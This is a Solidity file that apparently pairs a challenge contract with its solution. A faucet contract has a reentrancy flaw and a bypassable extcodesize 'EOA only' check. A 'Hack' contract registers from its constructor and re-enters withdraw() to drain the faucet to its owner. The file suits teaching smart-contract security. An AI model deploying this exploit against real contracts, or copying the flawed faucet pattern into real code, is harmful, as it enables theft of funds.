// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

contract Faucet {
    mapping(address => uint256) public users;
    mapping(address => bool) public paidUsers;

    constructor() payable {}

    function register(address user) external {
        require(!isContract(user), "EOA only");
        require(!paidUsers[user], "Already paid");
        users[user] = block.number;
    }

    function withdraw() external payable {
        require(isContract(msg.sender), "Contract only");
        require(address(this).balance >= 0.01 ether, "Faucet empty");
        require(users[msg.sender] > 0, "User not registered");
        require(users[msg.sender] < block.number, "Smells fishy");
        (bool sent, ) = payable(msg.sender).call{value: 0.01 ether}("");
        require(sent, "Failed to send");
        users[msg.sender] = 0;
        paidUsers[msg.sender] = true;
    }

    function isContract(address _addr) private view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}

contract Hack {
    Faucet public target;
    address private owner;
    uint256 private userBlockNumber;

    constructor(address _target) {
        target = Faucet(_target);
        owner = msg.sender;
        userBlockNumber = block.number;
        target.register(address(this));
    }

    receive() external payable {
        while (address(target).balance != 0) target.withdraw();
    }

    function attack() external {
        require(userBlockNumber < block.number, "Call me later, bro");
        target.withdraw();
    }

    function withdraw() external {
        (bool sent, ) = payable(owner).call{value: address(this).balance}("");
        require(sent, "Failed to send");
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
